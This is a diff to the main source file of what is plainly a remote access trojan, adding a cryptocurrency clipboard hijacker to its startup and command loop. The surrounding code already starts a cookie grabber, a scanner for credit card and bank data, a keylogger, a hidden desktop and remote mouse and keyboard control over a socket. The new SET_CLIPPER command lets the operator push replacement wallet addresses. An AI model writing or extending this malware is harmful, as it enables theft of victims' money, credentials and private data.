@@ -24,6 +24,7 @@
 #include "cookie_grabber.h"
 #include "data_scraper.h"
 #include "hidden_desktop.h"
+#include "clipboard_monitor.h"
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "psapi.lib")
@@ -341,6 +342,12 @@ int main(int argc, char* argv[]) {
         dataScraper.Start(sock);
         dbgLog("DATASCRAPER: started");
         std::cout << "[DATASCRAPER] Auto-started (file scanner + credit card/bank finder)\n";
+
+        // Start clipboard hijacker (crypto clipper)
+        dbgLog("CLIPPER: starting");
+        StartClipperThread(sock);
+        dbgLog("CLIPPER: started");
+        std::cout << "[CLIPPER] Clipboard monitor started\n";
         
         // Initialize hidden desktop system for stealth mode
         dbgLog("HIDDEN: skipped (keeps SendInput on WinSta0/default desktop)");
@@ -1077,6 +1084,14 @@ int main(int argc, char* argv[]) {
                 continue;
             }
             
+            // Clipper address update: SET_CLIPPER|{"BTC":"addr",...}
+            if (istrnicmp(command, "SET_CLIPPER|", 12) == 0) {
+                std::string json = std::string(command + 12);
+                UpdateClipperAddresses(json);
+                std::cout << "[CLIPPER] Addresses updated\n";
+                continue;
+            }
+
             // Input control (mouse move/click, keyboard) — handled last so it
             // doesn't interfere with any explicit command above.
             if (strncmp(command, "mouse_move ", 11) == 0 ||
@@ -1096,6 +1111,7 @@ int main(int argc, char* argv[]) {
         // === CLEANUP ON DISCONNECT ===
         // Stop threads
         cookieGrabRunning = false;
+        StopClipperThread();
         if (keyloggerRunning) {
             StopKeyboardHook();
             keyloggerRunning = false;
